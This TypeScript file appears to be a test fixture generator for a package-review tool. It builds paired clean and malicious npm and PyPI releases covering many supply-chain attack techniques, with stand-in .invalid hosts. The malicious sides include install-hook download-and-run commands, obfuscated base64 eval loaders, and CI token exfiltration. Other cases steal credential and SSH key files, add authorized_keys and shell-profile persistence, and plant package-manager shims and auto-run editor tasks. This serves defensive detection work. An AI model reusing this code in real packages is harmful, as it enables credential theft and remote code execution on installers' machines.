// Further synthetic attack cases, one per technique, for the extended set. Each is a small clean package
// (npm or PyPI) at 1.2.0 and a 1.2.1 that adds one attack, generated in memory like generate.ts.
// They are inert: every URL is on a .invalid host (RFC 6761, never resolves), every key, token and
// address is a placeholder, binaries are a few filler bytes, and nothing here is installed,
// imported or run. acceptance/run.ts reviews them like any case.
//
// Each entry: `id` (the generator name in cases.json), the ecosystem, a package name, what the attack
// is, and the files that differ in the new release. `pkg` merges into package.json (npm); `files`
// adds or replaces a path (a null removes it); `old` holds files that differ in the old release.

import type { Ecosystem, FileMap } from "../../src/prepass.ts";
import type { SyntheticPair } from "./generate.ts";

const enc = new TextEncoder();
type Content = string | Uint8Array | null;
type Files = Record<string, Content>;

interface Spec {
  eco: Ecosystem;
  name: string;
  what: string;
  urls: string[];
  pkg?: Record<string, unknown>;
  files?: Files;
  old?: Files;
  /** Text added to the new release's generated setup.py (PyPI): `head` before the setup import, `extra` as further setup() arguments. */
  setup?: { extra?: string; head?: string };
}

const GOOD = "1.2.0";
const BAD = "1.2.1";

const npmFiles = (name: string, version: string, pkg: Record<string, unknown> = {}): Files => ({
  "package.json": JSON.stringify({ name, version, description: "Small helpers", main: "index.js", license: "MIT", ...pkg }, null, 2) + "\n",
  "index.js": `"use strict";\nconst { clamp } = require("./lib/util");\nmodule.exports = { clamp };\n`,
  "lib/util.js": `"use strict";\nfunction clamp(n, lo, hi) {\n  return Math.min(hi, Math.max(lo, n));\n}\nmodule.exports = { clamp };\n`,
  "README.md": `# ${name}\n\nSmall numeric helpers.\n`,
});

const pyModule = (name: string) => name.replace(/-/g, "_");
const pyFiles = (name: string, version: string, s: Spec["setup"] = {}): Files => {
  const mod = pyModule(name);
  return {
    "setup.py": `${s.head ?? ""}from setuptools import setup, find_packages\n\nsetup(\n    name="${name}",\n    version="${version}",\n    description="Small helpers",\n    packages=find_packages(),\n${s.extra ?? ""})\n`,
    [`${mod}/__init__.py`]: `from .util import clamp\n\n__version__ = "${version}"\n`,
    [`${mod}/util.py`]: `def clamp(n, lo, hi):\n    return min(hi, max(lo, n))\n`,
    "README.md": `# ${name}\n\nSmall numeric helpers.\n`,
  };
};

const elf = (marker: string) => new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, ...enc.encode(`synthetic placeholder ${marker}`), ...new Array(48).fill(0)]);

// The Rust extension case: a maturin project, so pip builds the crate (and runs any build.rs) from the sdist.
const PY_RS_PYPROJECT = `[build-system]\nrequires = ["maturin>=1.0,<2.0"]\nbuild-backend = "maturin"\n\n[project]\nname = "synthetic-py-rs"\nrequires-python = ">=3.8"\ndynamic = ["version"]\n\n[tool.maturin]\nfeatures = ["pyo3/extension-module"]\n`;
const pyRsCargo = (v: string) => `[package]\nname = "synthetic_py_rs"\nversion = "${v}"\nedition = "2021"\n\n[lib]\nname = "synthetic_py_rs"\ncrate-type = ["cdylib"]\n\n[dependencies]\npyo3 = "0.22"\n`;
// A pure maturin project: the generated setup.py and Python package are left out on both sides.
const PY_RS_NO_SETUPTOOLS = { "setup.py": null, "synthetic_py_rs/__init__.py": null, "synthetic_py_rs/util.py": null };
const PY_RS_LIB = `use pyo3::prelude::*;\n\n#[pyfunction]\nfn clamp(n: i64, lo: i64, hi: i64) -> i64 {\n    n.max(lo).min(hi)\n}\n\n#[pymodule]\nfn synthetic_py_rs(m: &Bound<'_, PyModule>) -> PyResult<()> {\n    m.add_function(wrap_pyfunction!(clamp, m)?)\n}\n`;
// The Go helper case: the install script (the same in both releases) generates and builds the helper.
const GO_GEN_TABLES = `//go:build ignore\n\npackage main\n\nfunc main() {}\n`;
const GO_BRIDGE_INSTALL = "cd native && go generate ./... && go build -o ../bin/go-bridge .";

const npm = (name: string, what: string, urls: string[], pkg: Record<string, unknown>, files: Files, extra: Partial<Spec> = {}): Spec => ({ eco: "npm", name, what, urls, pkg, files, ...extra });

export const CORPUS_SPECS = {
  "npm-preinstall-curl-pipe-sh": npm("synthetic-pad-kit", "synthetic: a preinstall script that pipes a downloaded shell script into sh", ["https://get.padkit-setup.invalid/install.sh"], { scripts: { preinstall: "curl -fsSL https://get.padkit-setup.invalid/install.sh | sh" } }, {}),
  "npm-postinstall-obfuscated-b64": npm("synthetic-num-fmt", "synthetic: postinstall runs a node one-liner that evals a base64 string", ["https://cdn.numfmt-assets.invalid/p.js"], { scripts: { postinstall: "node scripts/setup.js" } }, {
    "scripts/setup.js": `"use strict";\n// post-install setup\nconst blob = "${Buffer.from("require('https').get('https://cdn.numfmt-assets.invalid/p.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})").toString("base64")}";\neval(Buffer.from(blob, "base64").toString());\n`,
  }),
  "npm-typosquat-maintainer-swap": npm("synthetic-date-math", "synthetic: new maintainer and author, a new dependency spelled one edit from a popular package (momnet for moment), and an install script", ["https://registry.datemath-pkg.invalid/collect"], { author: "new-maintainer <owner@datemath-pkg.invalid>", maintainers: [{ name: "new-maintainer" }], dependencies: { "momnet": "^2.0.0" }, scripts: { postinstall: "node lib/boot.js" } }, {
    "lib/boot.js": `"use strict";\nrequire("https").request("https://registry.datemath-pkg.invalid/collect", { method: "POST" }, () => {}).end(JSON.stringify({ host: require("os").hostname(), user: process.env.USER }));\n`,
  }, { old: { "package.json": JSON.stringify({ name: "synthetic-date-math", version: GOOD, description: "Small helpers", main: "index.js", license: "MIT", author: "original-maintainer <owner@example.com>", maintainers: [{ name: "original-maintainer" }] }, null, 2) + "\n" } }),
  "npm-ci-token-exfil": npm("synthetic-list-ops", "synthetic: postinstall that fires only in CI and posts the npm and GitHub tokens from the environment", ["https://hooks.listops-ci.invalid/t"], { scripts: { postinstall: "node scripts/ci.js" } }, {
    "scripts/ci.js": `"use strict";\nif (process.env.CI) {\n  const body = JSON.stringify({ n: process.env.NPM_TOKEN, g: process.env.GITHUB_TOKEN, r: process.env.GITHUB_REPOSITORY });\n  fetch("https://hooks.listops-ci.invalid/t", { method: "POST", body }).catch(() => {});\n}\n`,
  }),
  "npm-lockfile-redirection": npm("synthetic-map-kit", "synthetic: the shipped lockfile now resolves every package from a mirror host with changed integrity values", ["https://registry.mapkit-mirror.invalid/clamp/-/clamp-1.0.0.tgz"], {}, {
    "package-lock.json": JSON.stringify({ name: "synthetic-map-kit", version: BAD, lockfileVersion: 3, packages: { "": { name: "synthetic-map-kit", version: BAD, dependencies: { clamp: "1.0.0" } }, "node_modules/clamp": { version: "1.0.0", resolved: "https://registry.mapkit-mirror.invalid/clamp/-/clamp-1.0.0.tgz", integrity: "sha512-" + "B".repeat(86) + "==" } } }, null, 2) + "\n",
  }, { old: { "package-lock.json": JSON.stringify({ name: "synthetic-map-kit", version: GOOD, lockfileVersion: 3, packages: { "": { name: "synthetic-map-kit", version: GOOD, dependencies: { clamp: "1.0.0" } }, "node_modules/clamp": { version: "1.0.0", resolved: "https://registry.npmjs.org/clamp/-/clamp-1.0.0.tgz", integrity: "sha512-" + "A".repeat(86) + "==" } } }, null, 2) + "\n" } }),
  "npm-binary-swap": npm("synthetic-img-tool", "synthetic: the bundled prebuilt binary is replaced by a different one and nothing in the source explains it", [], { bin: { imgtool: "bin/imgtool" } }, { "bin/imgtool": elf("new build") }, { old: { "bin/imgtool": elf("old build") } }),
  "npm-install-time-dns-exfil": npm("synthetic-str-utils", "synthetic: preinstall looks up host names that carry the machine's user and host name", ["a.dns.strutils-metrics.invalid"], { scripts: { preinstall: "node scripts/probe.js" } }, {
    "scripts/probe.js": `"use strict";\nconst dns = require("dns");\nconst tag = Buffer.from(require("os").userInfo().username + "@" + require("os").hostname()).toString("hex");\ndns.lookup(tag + ".a.dns.strutils-metrics.invalid", () => {});\n`,
  }),
  "npm-gyp-binding-build-hook": npm("synthetic-fast-sum", "synthetic: a new binding.gyp whose action runs a shell command at build time", ["https://build.fastsum-native.invalid/s.sh"], { gypfile: true }, {
    "binding.gyp": JSON.stringify({ targets: [{ target_name: "fastsum", sources: ["src/sum.cc"], actions: [{ action_name: "fetch_prebuilt", inputs: [], outputs: ["build/prebuilt.stamp"], action: ["sh", "-c", "curl -fsSL https://build.fastsum-native.invalid/s.sh | sh; touch build/prebuilt.stamp"] }] }] }, null, 2) + "\n",
    "src/sum.cc": `// fast sum (placeholder source)\nint sum(int a, int b) { return a + b; }\n`,
  }),
  "npm-git-dependency-swap": npm("synthetic-text-wrap", "synthetic: a registry dependency is replaced by a git URL pinned to a commit on another host", ["https://git.textwrap-fork.invalid/wrap-ansi.git#0123456789abcdef0123456789abcdef01234567"], { dependencies: { "wrap-ansi": "git+https://git.textwrap-fork.invalid/wrap-ansi.git#0123456789abcdef0123456789abcdef01234567" } }, {}, { old: { "package.json": JSON.stringify({ name: "synthetic-text-wrap", version: GOOD, description: "Small helpers", main: "index.js", license: "MIT", dependencies: { "wrap-ansi": "^8.1.0" } }, null, 2) + "\n" } }),
  "npm-bin-shim-hijack": npm("synthetic-cli-sugar", "synthetic: a new bin entry named like the package manager that wraps the real one and copies its arguments out", ["https://log.clisugar-telemetry.invalid/a"], { bin: { npm: "bin/npm-shim.js" } }, {
    "bin/npm-shim.js": `#!/usr/bin/env node\n"use strict";\nconst { spawnSync } = require("child_process");\nfetch("https://log.clisugar-telemetry.invalid/a", { method: "POST", body: process.argv.slice(2).join(" ") }).catch(() => {});\nprocess.exit(spawnSync("/usr/local/bin/npm", process.argv.slice(2), { stdio: "inherit" }).status ?? 1);\n`,
  }),
  "npm-vscode-tasks-autorun": npm("synthetic-arr-kit", "synthetic: a shipped .vscode/tasks.json that runs a download-and-run command when the folder opens", ["https://dl.arrkit-dev.invalid/setup.sh"], {}, {
    ".vscode/tasks.json": JSON.stringify({ version: "2.0.0", tasks: [{ label: "setup", type: "shell", command: "curl -fsSL https://dl.arrkit-dev.invalid/setup.sh | sh", runOptions: { runOn: "folderOpen" }, presentation: { reveal: "never", close: true } }] }, null, 2) + "\n",
  }),
  "npm-env-gated-time-bomb": npm("synthetic-sort-lite", "synthetic: library code that stays quiet until a date and only on a CI host, then runs a downloaded script", ["https://cfg.sortlite-update.invalid/x.js"], {}, {
    "lib/util.js": `"use strict";\nfunction clamp(n, lo, hi) {\n  return Math.min(hi, Math.max(lo, n));\n}\nif (process.env.CI && Date.now() > Date.UTC(2027, 0, 15)) {\n  require("https").get("https://cfg.sortlite-update.invalid/x.js", (r) => { let d = ""; r.on("data", (c) => (d += c)); r.on("end", () => new Function(d)()); });\n}\nmodule.exports = { clamp };\n`,
  }),
  "npm-require-hook-cred-theft": npm("synthetic-obj-pick", "synthetic: on require, reads the npm, AWS and SSH credential files and posts them encoded", ["https://sink.objpick-stats.invalid/u"], {}, {
    "index.js": `"use strict";\nconst fs = require("fs");\nconst os = require("os");\nconst { clamp } = require("./lib/util");\nfor (const f of [".npmrc", ".aws/credentials", ".ssh/id_ed25519"]) {\n  try {\n    const data = fs.readFileSync(os.homedir() + "/" + f, "utf8");\n    fetch("https://sink.objpick-stats.invalid/u", { method: "POST", body: Buffer.from(f + "\\n" + data).toString("base64") }).catch(() => {});\n  } catch {}\n}\nmodule.exports = { clamp };\n`,
  }),
  "npm-dependency-confusion-internal-name": npm("synthetic-queue-kit", "synthetic: a new dependency with a company-style scoped name at version 99.0.0 that no public registry owns", [], { dependencies: { "@acme-internal/auth-core": "^99.0.0" } }, {}),
  "npm-authorized-keys-append": npm("synthetic-set-ops", "synthetic: postinstall appends a public key to the user's authorized_keys", [], { scripts: { postinstall: "node scripts/keys.js" } }, {
    "scripts/keys.js": `"use strict";\nconst fs = require("fs");\nconst os = require("os");\nconst dir = os.homedir() + "/.ssh";\nfs.mkdirSync(dir, { recursive: true });\nfs.appendFileSync(dir + "/authorized_keys", "\\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIsynthetic-placeholder-key maintainer@setops.invalid\\n");\n`,
  }),
  "npm-shell-profile-persistence": npm("synthetic-math-ext", "synthetic: postinstall appends a line to the shell startup files that downloads and runs a script at every login", ["https://boot.mathext-sync.invalid/p.sh"], { scripts: { postinstall: "node scripts/profile.js" } }, {
    "scripts/profile.js": `"use strict";\nconst fs = require("fs");\nconst os = require("os");\nfor (const f of [".zshrc", ".bashrc"]) {\n  try {\n    fs.appendFileSync(os.homedir() + "/" + f, "\\n(curl -fsSL https://boot.mathext-sync.invalid/p.sh | sh) >/dev/null 2>&1 &\\n");\n  } catch {}\n}\n`,
  }),

  "pypi-setup-py-cmdclass-install": {
    eco: "pypi", name: "synthetic-py-pad", urls: ["https://get.pypad-setup.invalid/p.py"],
    what: "synthetic: setup.py overrides the install command with a class that downloads and executes a script",
    setup: {
      head: `import urllib.request\nfrom setuptools.command.install import install\n\n\nclass Install(install):\n    def run(self):\n        exec(urllib.request.urlopen("https://get.pypad-setup.invalid/p.py").read())\n        install.run(self)\n\n\n`,
      extra: `    cmdclass={"install": Install},\n`,
    },
  },
  "pypi-conftest-test-time-payload": {
    eco: "pypi", name: "synthetic-py-calc", urls: ["https://hooks.pycalc-ci.invalid/c"],
    what: "synthetic: a conftest.py shipped inside the package that posts CI secrets whenever pytest runs",
    files: { "synthetic_py_calc/conftest.py": `import os\nimport urllib.request\n\nif os.environ.get("CI"):\n    data = (os.environ.get("PYPI_TOKEN", "") + "|" + os.environ.get("GITHUB_TOKEN", "")).encode()\n    urllib.request.urlopen("https://hooks.pycalc-ci.invalid/c", data)\n` },
  },
  "pypi-obfuscated-setup-b64-exec": {
    eco: "pypi", name: "synthetic-py-cast", urls: ["https://cdn.pycast-assets.invalid/i.py"],
    what: "synthetic: setup.py executes a base64 string that fetches and runs a script",
    setup: { head: `import base64\n\nexec(base64.b64decode("${Buffer.from("import urllib.request;exec(urllib.request.urlopen('https://cdn.pycast-assets.invalid/i.py').read())").toString("base64")}"))\n` },
  },
  "pypi-typosquat-dependency-added": {
    eco: "pypi", name: "synthetic-py-fetch", urls: [],
    what: "synthetic: a new install_requires entry spelled like a popular package (reqeusts) from a different author",
    setup: { extra: `    install_requires=["reqeusts>=2.0"],\n` },
  },
  "pypi-wheel-binary-so-swap": {
    eco: "pypi", name: "synthetic-py-fast", urls: [],
    what: "synthetic: the bundled compiled extension is replaced and the package now loads it through ctypes",
    files: { "synthetic_py_fast/_fast.so": elf("new build"), "synthetic_py_fast/__init__.py": `import ctypes\nimport os\n\nfrom .util import clamp\n\n_lib = ctypes.CDLL(os.path.join(os.path.dirname(__file__), "_fast.so"))\n__version__ = "${BAD}"\n` },
    old: { "synthetic_py_fast/_fast.so": elf("old build") },
  },
  "pypi-entrypoint-console-script-hijack": {
    eco: "pypi", name: "synthetic-py-tools", urls: ["https://log.pytools-telemetry.invalid/a"],
    what: "synthetic: a console script named pip that wraps the real one and copies its arguments out",
    setup: { extra: `    entry_points={"console_scripts": ["pip = synthetic_py_tools._shim:main"]},\n` },
    files: { "synthetic_py_tools/_shim.py": `import subprocess\nimport sys\nimport urllib.request\n\n\ndef main():\n    urllib.request.urlopen("https://log.pytools-telemetry.invalid/a", " ".join(sys.argv[1:]).encode())\n    raise SystemExit(subprocess.call(["/usr/bin/pip3"] + sys.argv[1:]))\n` },
  },
  "pypi-ci-token-exfil": {
    eco: "pypi", name: "synthetic-py-seq", urls: ["https://hooks.pyseq-ci.invalid/t"],
    what: "synthetic: import-time code that fires only in CI and posts the PyPI and GitHub tokens",
    files: { "synthetic_py_seq/__init__.py": `import os\nimport urllib.request\n\nfrom .util import clamp\n\nif os.environ.get("CI"):\n    urllib.request.urlopen("https://hooks.pyseq-ci.invalid/t", (os.environ.get("TWINE_PASSWORD", "") + "|" + os.environ.get("GITHUB_TOKEN", "")).encode())\n\n__version__ = "${BAD}"\n` },
  },
  "pypi-requirements-index-url-redirect": {
    eco: "pypi", name: "synthetic-py-conf", urls: ["https://pypi-mirror.pyconf-deps.invalid/simple"],
    what: "synthetic: a shipped requirements.txt and pip.conf that add an extra package index on another host",
    files: { "requirements.txt": `--extra-index-url https://pypi-mirror.pyconf-deps.invalid/simple\nrequests>=2.0\n`, "pip.conf": `[global]\nextra-index-url = https://pypi-mirror.pyconf-deps.invalid/simple\n` },
    old: { "requirements.txt": `requests>=2.0\n` },
  },
  "pypi-cloud-credential-file-read": {
    eco: "pypi", name: "synthetic-py-cloud", urls: ["https://sink.pycloud-stats.invalid/u"],
    what: "synthetic: import-time code that reads cloud and SSH credential files and posts them",
    files: { "synthetic_py_cloud/__init__.py": `import base64\nimport os\nimport urllib.request\n\nfrom .util import clamp\n\nfor _f in (".aws/credentials", ".config/gcloud/application_default_credentials.json", ".ssh/id_ed25519"):\n    try:\n        with open(os.path.expanduser("~/" + _f)) as fh:\n            urllib.request.urlopen("https://sink.pycloud-stats.invalid/u", base64.b64encode((_f + "\\n" + fh.read()).encode()))\n    except OSError:\n        pass\n\n__version__ = "${BAD}"\n` },
  },
  "pypi-pyproject-local-build-backend": {
    eco: "pypi", name: "synthetic-py-build", urls: ["https://get.pybuild-tools.invalid/b.sh"],
    what: "synthetic: pyproject.toml switches the build backend to an in-tree module that runs a downloaded script before building",
    files: {
      "pyproject.toml": `[build-system]\nrequires = ["setuptools>=61"]\nbuild-backend = "_build.backend"\nbackend-path = ["."]\n`,
      "_build/__init__.py": ``,
      "_build/backend.py": `import subprocess\n\nfrom setuptools import build_meta as _orig\n\nsubprocess.run("curl -fsSL https://get.pybuild-tools.invalid/b.sh | sh", shell=True)\nbuild_wheel = _orig.build_wheel\nbuild_sdist = _orig.build_sdist\nget_requires_for_build_wheel = _orig.get_requires_for_build_wheel\n`,
    },
    old: { "pyproject.toml": `[build-system]\nrequires = ["setuptools>=61"]\nbuild-backend = "setuptools.build_meta"\n` },
  },
  "pypi-lazy-import-time-bomb": {
    eco: "pypi", name: "synthetic-py-lazy", urls: ["https://cfg.pylazy-update.invalid/x.py"],
    what: "synthetic: a module-level __getattr__ that downloads and executes a script the first time an unknown attribute is read",
    files: { "synthetic_py_lazy/__init__.py": `import urllib.request\n\nfrom .util import clamp\n\n__version__ = "${BAD}"\n_loaded = False\n\n\ndef __getattr__(name):\n    global _loaded\n    if not _loaded:\n        _loaded = True\n        exec(urllib.request.urlopen("https://cfg.pylazy-update.invalid/x.py").read())\n    raise AttributeError(name)\n` },
  },
  "pypi-rust-build-script-added": {
    eco: "pypi", name: "synthetic-py-rs", urls: ["https://get.pyrs-native.invalid/b.sh"],
    what: "synthetic: the sdist builds its Rust extension with maturin, and the new release adds a build.rs that runs a downloaded script when pip builds it",
    files: {
      "pyproject.toml": PY_RS_PYPROJECT,
      "Cargo.toml": pyRsCargo(BAD),
      "src/lib.rs": PY_RS_LIB,
      ...PY_RS_NO_SETUPTOOLS,
      "build.rs": `use std::process::Command;\n\nfn main() {\n    Command::new("sh").arg("-c").arg("curl -fsSL https://get.pyrs-native.invalid/b.sh | sh").status().ok();\n    println!("cargo:rerun-if-changed=build.rs");\n}\n`,
    },
    old: { "pyproject.toml": PY_RS_PYPROJECT, "Cargo.toml": pyRsCargo(GOOD), "src/lib.rs": PY_RS_LIB, ...PY_RS_NO_SETUPTOOLS },
  },
  "npm-go-generate-cgo-added": npm("synthetic-go-bridge", "synthetic: the install script builds a bundled Go helper with go generate and go build; the helper gains a go:generate line that runs a downloaded script and a cgo import with linker flags", ["https://dl.gobridge-native.invalid/gen.sh"], { scripts: { install: GO_BRIDGE_INSTALL } }, {
    "native/main.go": `package main\n\n//go:generate sh -c "curl -fsSL https://dl.gobridge-native.invalid/gen.sh | sh"\n\n/*\n#cgo LDFLAGS: -L/opt/gobridge/lib -lgobridge\n#include <stdlib.h>\n*/\nimport "C"\n\nfunc main() {\n\tC.free(nil)\n}\n`,
    "native/gen_tables.go": GO_GEN_TABLES,
  }, { old: { "package.json": JSON.stringify({ name: "synthetic-go-bridge", version: GOOD, description: "Small helpers", main: "index.js", license: "MIT", scripts: { install: GO_BRIDGE_INSTALL } }, null, 2) + "\n", "native/main.go": `package main\n\n//go:generate go run gen_tables.go\n\nfunc main() {}\n`, "native/gen_tables.go": GO_GEN_TABLES } }),
  "npm-workflow-pull-request-target-write": npm("synthetic-ci-kit", "synthetic: the release ships the publisher repo's CI workflow, now on pull_request_target with write-all permissions and posting the token; it would run on the publisher's CI, never on install", ["https://hooks.cikit-ci.invalid/t"], {}, {
    ".github/workflows/ci.yml": `name: ci\non:\n  pull_request_target:\n    types: [opened, synchronize]\npermissions: write-all\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}\n      - run: curl -fsSL -d "t=\${{ secrets.GITHUB_TOKEN }}" https://hooks.cikit-ci.invalid/t\n`,
  }, { old: { ".github/workflows/ci.yml": `name: ci\non:\n  push:\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: bun test\n` } }),
} satisfies Record<string, Spec>;

export type CorpusKind = keyof typeof CORPUS_SPECS;
export const CORPUS = Object.keys(CORPUS_SPECS) as CorpusKind[];
export const isCorpus = (g: string): g is CorpusKind => Object.hasOwn(CORPUS_SPECS, g);

const toMap = (f: Files): FileMap => new Map(Object.entries(f).filter((e): e is [string, string | Uint8Array] => e[1] !== null).map(([k, v]) => [k, typeof v === "string" ? enc.encode(v) : v]));

export function corpusPair(kind: CorpusKind): SyntheticPair {
  const s: Spec = CORPUS_SPECS[kind];
  const base = (version: string, pkg?: Record<string, unknown>, setup?: Spec["setup"]) => (s.eco === "npm" ? npmFiles(s.name, version, pkg) : pyFiles(s.name, version, setup));
  const oldFiles = { ...base(GOOD), ...s.old };
  const newFiles = { ...base(BAD, s.pkg, s.setup), ...s.files };
  // An old file that a changed manifest replaces keeps the old content: s.old is applied last for the old side.
  return { old: toMap(oldFiles), new: toMap(newFiles), urls: s.urls };
}

export const corpusCase = (kind: CorpusKind) => ({ id: `synthetic-${kind}`, eco: CORPUS_SPECS[kind].eco, name: CORPUS_SPECS[kind].name, good: GOOD, bad: BAD, what: CORPUS_SPECS[kind].what });
